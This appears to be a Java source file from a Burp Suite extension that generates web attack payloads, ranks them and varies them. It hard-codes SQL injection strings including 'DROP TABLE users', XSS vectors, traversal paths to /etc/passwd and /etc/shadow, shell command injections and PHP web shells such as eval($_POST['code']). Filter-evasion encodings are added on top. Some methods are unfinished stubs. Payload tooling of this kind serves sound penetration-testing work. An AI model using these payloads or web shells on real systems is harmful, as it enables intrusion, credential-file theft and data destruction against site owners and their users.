package com.secure.ai.burp.payloads;

import com.secure.ai.burp.core.ApplicationContext;
import com.secure.ai.burp.ml.AdvancedModelManager;
import com.secure.ai.burp.ml.PatternLearner;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.Collectors;

/**
 * Intelligent payload generator that creates context-aware, adaptive payloads
 * Uses ML models and learned patterns to generate highly targeted attack vectors
 */
public class IntelligentPayloadGenerator {
    private static final Logger logger = LoggerFactory.getLogger(IntelligentPayloadGenerator.class);
    
    private final AdvancedModelManager modelManager;
    private final PatternLearner patternLearner;
    private final Map<String, PayloadTemplate> templates;
    private final PayloadEvolutionEngine evolutionEngine;
    
    // Payload categories and their base templates
    private final Map<String, List<String>> basePayloads;
    
    public IntelligentPayloadGenerator(AdvancedModelManager modelManager, PatternLearner patternLearner) {
        this.modelManager = modelManager;
        this.patternLearner = patternLearner;
        this.templates = initializeTemplates();
        this.evolutionEngine = new PayloadEvolutionEngine();
        this.basePayloads = initializeBasePayloads();
        
        logger.info("Intelligent payload generator initialized with {} templates", templates.size());
    }
    
    /**
     * Generate intelligent payloads for a specific vulnerability type
     */
    public List<IntelligentPayload> generatePayloads(String vulnerabilityType, 
                                                    HttpRequest request, 
                                                    ApplicationContext context,
                                                    int maxPayloads) {
        try {
            List<IntelligentPayload> payloads = new ArrayList<>();
            
            // Get context information
            PayloadContext payloadContext = analyzeContext(request, context);
            
            // Generate base payloads for the vulnerability type
            List<String> baseTemplates = basePayloads.getOrDefault(
                vulnerabilityType.toLowerCase().replace(" ", "_"), 
                basePayloads.get("generic"));
            
            // Generate context-aware variations
            for (String template : baseTemplates.subList(0, Math.min(baseTemplates.size(), maxPayloads / 2))) {
                payloads.addAll(generateVariations(template, vulnerabilityType, payloadContext));
            }
            
            // Generate ML-enhanced payloads
            payloads.addAll(generateMLEnhancedPayloads(vulnerabilityType, payloadContext, maxPayloads / 3));
            
            // Generate evolved payloads based on learned patterns
            payloads.addAll(generateEvolvedPayloads(vulnerabilityType, payloadContext, maxPayloads / 4));
            
            // Generate technology-specific payloads
            payloads.addAll(generateTechnologySpecificPayloads(vulnerabilityType, context, maxPayloads / 4));
            
            // Score and sort payloads by relevance
            payloads.forEach(payload -> scorePayloadRelevance(payload, payloadContext));
            payloads.sort((a, b) -> Double.compare(b.getRelevanceScore(), a.getRelevanceScore()));
            
            // Limit to requested count
            List<IntelligentPayload> result = payloads.stream()
                .distinct()
                .limit(maxPayloads)
                .collect(Collectors.toList());
            
            logger.debug("Generated {} intelligent payloads for {}", result.size(), vulnerabilityType);
            return result;
            
        } catch (Exception e) {
            logger.error("Failed to generate payloads for " + vulnerabilityType, e);
            return generateFallbackPayloads(vulnerabilityType, maxPayloads);
        }
    }
    
    /**
     * Learn from payload effectiveness to improve future generation
     */
    public void learnFromPayloadEffectiveness(IntelligentPayload payload, boolean wasEffective, 
                                            String responseContent, double responseTime) {
        try {
            PayloadFeedback feedback = new PayloadFeedback(
                payload, wasEffective, responseContent, responseTime, System.currentTimeMillis());
            
            // Update pattern learner
            patternLearner.learnPattern(payload.getPayload(), payload.getType(), 
                                      wasEffective ? 1.0 : 0.0);
            
            // Update evolution engine
            evolutionEngine.provideFeedback(feedback);
            
            logger.debug("Learned from payload effectiveness: {} -> {}", 
                        payload.getPayload().substring(0, Math.min(50, payload.getPayload().length())), 
                        wasEffective);
                        
        } catch (Exception e) {
            logger.debug("Failed to learn from payload feedback", e);
        }
    }
    
    private PayloadContext analyzeContext(HttpRequest request, ApplicationContext context) {
        PayloadContextBuilder builder = new PayloadContextBuilder();
        
        // Request analysis
        builder.withMethod(request.method())
               .withPath(request.path())
               .withContentType(request.headerValue("Content-Type"))
               .withParameters(extractParameters(request))
               .withHeaders(extractHeaders(request));
        
        // Application context
        builder.withTechnologies(context.getDetectedTechnologies())
               .withApplicationType(context.getApplicationType())
               .withEndpoints(context.getDiscoveredEndpoints());
        
        // Content analysis
        String body = request.bodyToString();
        if (!body.isEmpty()) {
            builder.withBodyContent(body)
                   .withBodyEntropy(calculateEntropy(body))
                   .withBodyLength(body.length());
        }
        
        return builder.build();
    }
    
    private List<IntelligentPayload> generateVariations(String template, String type, PayloadContext context) {
        List<IntelligentPayload> variations = new ArrayList<>();
        
        PayloadTemplate payloadTemplate = templates.get(type.toLowerCase().replace(" ", "_"));
        if (payloadTemplate == null) {
            payloadTemplate = templates.get("generic");
        }
        
        // Generate encoding variations
        variations.addAll(generateEncodingVariations(template, type, context));
        
        // Generate context-specific variations
        variations.addAll(generateContextVariations(template, type, context, payloadTemplate));
        
        // Generate evasion variations
        variations.addAll(generateEvasionVariations(template, type, context));
        
        return variations;
    }
    
    private List<IntelligentPayload> generateMLEnhancedPayloads(String type, PayloadContext context, int count) {
        List<IntelligentPayload> payloads = new ArrayList<>();
        
        try {
            // Use ML model to generate contextually relevant payloads
            Map<String, Object> mlContext = createMLContext(context);
            
            for (int i = 0; i < count; i++) {
                String generatedPayload = generateMLPayload(type, mlContext);
                if (generatedPayload != null && !generatedPayload.isEmpty()) {
                    payloads.add(new IntelligentPayload(
                        type,
                        generatedPayload,
                        0.8, // High relevance for ML-generated payloads
                        "ML-generated payload for " + type,
                        Map.of("generation_method", "ml_enhanced", "iteration", i)
                    ));
                }
            }
        } catch (Exception e) {
            logger.debug("ML payload generation failed", e);
        }
        
        return payloads;
    }
    
    private List<IntelligentPayload> generateEvolvedPayloads(String type, PayloadContext context, int count) {
        List<IntelligentPayload> payloads = new ArrayList<>();
        
        // Get learned patterns from pattern learner
        List<String> learnedPatterns = patternLearner.getEffectivePatterns(type, 0.7);
        
        for (String pattern : learnedPatterns.subList(0, Math.min(learnedPatterns.size(), count))) {
            // Evolve the pattern based on context
            String evolvedPayload = evolutionEngine.evolvePayload(pattern, context);
            
            payloads.add(new IntelligentPayload(
                type,
                evolvedPayload,
                0.9, // Very high relevance for evolved payloads
                "Evolved payload based on learned patterns",
                Map.of("generation_method", "evolved", "base_pattern", pattern.substring(0, Math.min(20, pattern.length())))
            ));
        }
        
        return payloads;
    }
    
    private List<IntelligentPayload> generateTechnologySpecificPayloads(String type, ApplicationContext context, int count) {
        List<IntelligentPayload> payloads = new ArrayList<>();
        
        for (String technology : context.getDetectedTechnologies()) {
            List<String> techPayloads = getTechnologyPayloads(technology, type);
            
            for (String payload : techPayloads.subList(0, Math.min(techPayloads.size(), count / context.getDetectedTechnologies().size()))) {
                payloads.add(new IntelligentPayload(
                    type,
                    payload,
                    0.7,
                    "Technology-specific payload for " + technology,
                    Map.of("generation_method", "technology_specific", "technology", technology)
                ));
            }
        }
        
        return payloads;
    }
    
    private List<IntelligentPayload> generateEncodingVariations(String template, String type, PayloadContext context) {
        List<IntelligentPayload> variations = new ArrayList<>();
        
        // URL encoding variations
        variations.add(new IntelligentPayload(
            type,
            urlEncode(template),
            0.6,
            "URL encoded variation",
            Map.of("encoding", "url")
        ));
        
        // Double URL encoding
        variations.add(new IntelligentPayload(
            type,
            urlEncode(urlEncode(template)),
            0.5,
            "Double URL encoded variation",
            Map.of("encoding", "double_url")
        ));
        
        // HTML entity encoding
        variations.add(new IntelligentPayload(
            type,
            htmlEncode(template),
            0.6,
            "HTML entity encoded variation",
            Map.of("encoding", "html_entity")
        ));
        
        // Unicode encoding
        variations.add(new IntelligentPayload(
            type,
            unicodeEncode(template),
            0.5,
            "Unicode encoded variation",
            Map.of("encoding", "unicode")
        ));
        
        // Base64 encoding (for some contexts)
        if (context.getContentType() != null && context.getContentType().contains("json")) {
            variations.add(new IntelligentPayload(
                type,
                Base64.getEncoder().encodeToString(template.getBytes()),
                0.4,
                "Base64 encoded variation",
                Map.of("encoding", "base64")
            ));
        }
        
        return variations;
    }
    
    private List<IntelligentPayload> generateContextVariations(String template, String type, 
                                                             PayloadContext context, PayloadTemplate payloadTemplate) {
        List<IntelligentPayload> variations = new ArrayList<>();
        
        // Parameter-specific variations
        for (String paramName : context.getParameters().keySet()) {
            String contextualPayload = payloadTemplate.generateContextualPayload(template, paramName, context);
            variations.add(new IntelligentPayload(
                type,
                contextualPayload,
                0.7,
                "Parameter-contextual variation for " + paramName,
                Map.of("context", "parameter", "parameter_name", paramName)
            ));
        }
        
        // Content-type specific variations
        if (context.getContentType() != null) {
            if (context.getContentType().contains("json")) {
                variations.add(new IntelligentPayload(
                    type,
                    wrapInJSON(template),
                    0.8,
                    "JSON-wrapped variation",
                    Map.of("context", "json")
                ));
            } else if (context.getContentType().contains("xml")) {
                variations.add(new IntelligentPayload(
                    type,
                    wrapInXML(template),
                    0.8,
                    "XML-wrapped variation",
                    Map.of("context", "xml")
                ));
            }
        }
        
        return variations;
    }
    
    private List<IntelligentPayload> generateEvasionVariations(String template, String type, PayloadContext context) {
        List<IntelligentPayload> variations = new ArrayList<>();
        
        // Case variations
        variations.add(new IntelligentPayload(
            type,
            template.toLowerCase(),
            0.5,
            "Lowercase evasion",
            Map.of("evasion", "lowercase")
        ));
        
        variations.add(new IntelligentPayload(
            type,
            template.toUpperCase(),
            0.5,
            "Uppercase evasion",
            Map.of("evasion", "uppercase")
        ));
        
        // Mixed case
        variations.add(new IntelligentPayload(
            type,
            mixCase(template),
            0.5,
            "Mixed case evasion",
            Map.of("evasion", "mixed_case")
        ));
        
        // Comment insertion (for SQL/code injection)
        if (type.toLowerCase().contains("injection")) {
            variations.add(new IntelligentPayload(
                type,
                insertComments(template),
                0.6,
                "Comment insertion evasion",
                Map.of("evasion", "comment_insertion")
            ));
        }
        
        // Space variations
        variations.add(new IntelligentPayload(
            type,
            template.replace(" ", "/**/"),
            0.6,
            "Space replacement evasion",
            Map.of("evasion", "space_replacement")
        ));
        
        return variations;
    }
    
    private String generateMLPayload(String type, Map<String, Object> context) {
        // This would integrate with the ML model to generate contextual payloads
        // For now, we'll use a simplified approach
        
        List<String> baseTemplates = basePayloads.get(type.toLowerCase().replace(" ", "_"));
        if (baseTemplates == null || baseTemplates.isEmpty()) {
            return null;
        }
        
        // Select a random base template and enhance it
        String base = baseTemplates.get(ThreadLocalRandom.current().nextInt(baseTemplates.size()));
        
        // Apply ML-based enhancements
        return enhanceWithMLFeatures(base, context);
    }
    
    private String enhanceWithMLFeatures(String base, Map<String, Object> context) {
        StringBuilder enhanced = new StringBuilder(base);
        
        // Add contextual elements based on detected technologies
        @SuppressWarnings("unchecked")
        Set<String> technologies = (Set<String>) context.getOrDefault("technologies", Set.of());
        
        for (String tech : technologies) {
            if (tech.toLowerCase().contains("mysql")) {
                enhanced.append(" -- MySQL specific");
            } else if (tech.toLowerCase().contains("postgres")) {
                enhanced.append(" /* PostgreSQL */");
            } else if (tech.toLowerCase().contains("php")) {
                enhanced.append("<?php echo 'test'; ?>");
            }
        }
        
        return enhanced.toString();
    }
    
    private Map<String, Object> createMLContext(PayloadContext context) {
        Map<String, Object> mlContext = new HashMap<>();
        mlContext.put("method", context.getMethod());
        mlContext.put("content_type", context.getContentType());
        mlContext.put("technologies", context.getTechnologies());
        mlContext.put("parameter_count", context.getParameters().size());
        mlContext.put("body_length", context.getBodyLength());
        mlContext.put("body_entropy", context.getBodyEntropy());
        return mlContext;
    }
    
    private void scorePayloadRelevance(IntelligentPayload payload, PayloadContext context) {
        double score = payload.getRelevanceScore();
        
        // Boost score based on context relevance
        if (payload.getMetadata().containsKey("technology")) {
            String tech = (String) payload.getMetadata().get("technology");
            if (context.getTechnologies().contains(tech)) {
                score += 0.2;
            }
        }
        
        // Boost score for evolved payloads
        if ("evolved".equals(payload.getMetadata().get("generation_method"))) {
            score += 0.1;
        }
        
        // Penalize overly complex payloads
        if (payload.getPayload().length() > 500) {
            score -= 0.1;
        }
        
        // Update the payload's relevance score
        // Note: This would require making relevanceScore mutable or creating a new payload
    }
    
    private List<String> getTechnologyPayloads(String technology, String type) {
        Map<String, List<String>> techPayloads = new HashMap<>();
        
        // WordPress specific payloads
        techPayloads.put("WordPress", List.of(
            "wp-config.php",
            "../wp-config.php",
            "/wp-admin/admin-ajax.php",
            "wp_users",
            "wp_posts"
        ));
        
        // PHP specific payloads
        techPayloads.put("PHP", List.of(
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<?php eval($_POST['code']); ?>"
        ));
        
        // MySQL specific payloads
        techPayloads.put("MySQL", List.of(
            "' UNION SELECT 1,2,3,4,5 -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
            "'; DROP TABLE users; -- "
        ));
        
        return techPayloads.getOrDefault(technology, List.of());
    }
    
    // Encoding utilities
    private String urlEncode(String input) {
        return java.net.URLEncoder.encode(input, java.nio.charset.StandardCharsets.UTF_8);
    }
    
    private String htmlEncode(String input) {
        return input.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#x27;");
    }
    
    private String unicodeEncode(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (c > 127) {
                encoded.append("\\u").append(String.format("%04x", (int) c));
            } else {
                encoded.append(c);
            }
        }
        return encoded.toString();
    }
    
    private String wrapInJSON(String payload) {
        return "{\"data\":\"" + payload.replace("\"", "\\\"") + "\"}";
    }
    
    private String wrapInXML(String payload) {
        return "<data>" + payload.replace("<", "&lt;").replace(">", "&gt;") + "</data>";
    }
    
    private String mixCase(String input) {
        StringBuilder mixed = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            if (i % 2 == 0) {
                mixed.append(Character.toLowerCase(c));
            } else {
                mixed.append(Character.toUpperCase(c));
            }
        }
        return mixed.toString();
    }
    
    private String insertComments(String input) {
        return input.replace(" ", " /* comment */ ");
    }
    
    private double calculateEntropy(String data) {
        if (data.isEmpty()) return 0.0;
        
        Map<Character, Integer> frequencies = new HashMap<>();
        for (char c : data.toCharArray()) {
            frequencies.merge(c, 1, Integer::sum);
        }
        
        double entropy = 0.0;
        int length = data.length();
        
        for (int frequency : frequencies.values()) {
            double probability = (double) frequency / length;
            entropy -= probability * (Math.log(probability) / Math.log(2));
        }
        
        return entropy;
    }
    
    private Map<String, String> extractParameters(HttpRequest request) {
        Map<String, String> params = new HashMap<>();
        for (HttpParameter param : request.parameters()) {
            params.put(param.name(), param.value());
        }
        return params;
    }
    
    private Map<String, String> extractHeaders(HttpRequest request) {
        Map<String, String> headers = new HashMap<>();
        request.headers().forEach(header -> headers.put(header.name(), header.value()));
        return headers;
    }
    
    private List<IntelligentPayload> generateFallbackPayloads(String type, int count) {
        List<IntelligentPayload> fallback = new ArrayList<>();
        List<String> templates = basePayloads.getOrDefault("generic", List.of("'", "\"", "<script>", "../../"));
        
        for (int i = 0; i < Math.min(count, templates.size()); i++) {
            fallback.add(new IntelligentPayload(
                type,
                templates.get(i),
                0.3,
                "Fallback payload",
                Map.of("generation_method", "fallback")
            ));
        }
        
        return fallback;
    }
    
    private Map<String, PayloadTemplate> initializeTemplates() {
        Map<String, PayloadTemplate> templates = new HashMap<>();
        
        templates.put("sql_injection", new SQLInjectionTemplate());
        templates.put("cross-site_scripting", new XSSTemplate());
        templates.put("path_traversal", new PathTraversalTemplate());
        templates.put("code_injection", new CodeInjectionTemplate());
        templates.put("generic", new GenericTemplate());
        
        return templates;
    }
    
    private Map<String, List<String>> initializeBasePayloads() {
        Map<String, List<String>> payloads = new HashMap<>();
        
        // SQL Injection payloads
        payloads.put("sql_injection", List.of(
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "' UNION SELECT NULL -- ",
            "'; DROP TABLE users; -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
            "admin'--",
            "admin' /*",
            "' OR 'a'='a",
            "') OR ('a'='a"
        ));
        
        // XSS payloads
        payloads.put("cross-site_scripting", List.of(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>test</div>"
        ));
        
        // Path Traversal payloads
        payloads.put("path_traversal", List.of(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "../../../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ));
        
        // Code Injection payloads
        payloads.put("code_injection", List.of(
            "; system('id');",
            "| whoami",
            "; cat /etc/passwd;",
            "&& dir",
            "; ls -la;",
            "$(whoami)",
            "`id`",
            "; ping -c 1 127.0.0.1;",
            "|| echo vulnerable ||"
        ));
        
        // Generic payloads
        payloads.put("generic", List.of(
            "'",
            "\"",
            "<",
            ">",
            "&",
            "../",
            "../../",
            "%00",
            "%0a",
            "%0d%0a"
        ));
        
        return payloads;
    }
    
    // Supporting classes
    
    public static class IntelligentPayload {
        private final String type;
        private final String payload;
        private final double relevanceScore;
        private final String description;
        private final Map<String, Object> metadata;
        
        public IntelligentPayload(String type, String payload, double relevanceScore,
                                String description, Map<String, Object> metadata) {
            this.type = type;
            this.payload = payload;
            this.relevanceScore = relevanceScore;
            this.description = description;
            this.metadata = metadata;
        }
        
        @Override
        public boolean equals(Object obj) {
            if (this == obj) return true;
            if (!(obj instanceof IntelligentPayload)) return false;
            IntelligentPayload other = (IntelligentPayload) obj;
            return payload.equals(other.payload) && type.equals(other.type);
        }
        
        @Override
        public int hashCode() {
            return Objects.hash(type, payload);
        }
        
        // Getters
        public String getType() { return type; }
        public String getPayload() { return payload; }
        public double getRelevanceScore() { return relevanceScore; }
        public String getDescription() { return description; }
        public Map<String, Object> getMetadata() { return metadata; }
    }
    
    // Abstract payload template
    abstract static class PayloadTemplate {
        abstract String generateContextualPayload(String base, String context, PayloadContext payloadContext);
    }
    
    static class SQLInjectionTemplate extends PayloadTemplate {
        @Override
        String generateContextualPayload(String base, String context, PayloadContext payloadContext) {
            if (context.toLowerCase().contains("id") || context.toLowerCase().contains("user")) {
                return base + " AND 1=1";
            }
            return base;
        }
    }
    
    static class XSSTemplate extends PayloadTemplate {
        @Override
        String generateContextualPayload(String base, String context, PayloadContext payloadContext) {
            if (context.toLowerCase().contains("search") || context.toLowerCase().contains("query")) {
                return "<img src=x onerror=alert('" + context + "')>";
            }
            return base;
        }
    }
    
    static class PathTraversalTemplate extends PayloadTemplate {
        @Override
        String generateContextualPayload(String base, String context, PayloadContext payloadContext) {
            if (context.toLowerCase().contains("file") || context.toLowerCase().contains("path")) {
                return base + "%00";
            }
            return base;
        }
    }
    
    static class CodeInjectionTemplate extends PayloadTemplate {
        @Override
        String generateContextualPayload(String base, String context, PayloadContext payloadContext) {
            if (payloadContext.getTechnologies().contains("Linux")) {
                return base.replace("dir", "ls");
            }
            return base;
        }
    }
    
    static class GenericTemplate extends PayloadTemplate {
        @Override
        String generateContextualPayload(String base, String context, PayloadContext payloadContext) {
            return base;
        }
    }
    
    // Additional supporting classes would be here (PayloadContext, PayloadEvolutionEngine, etc.)
}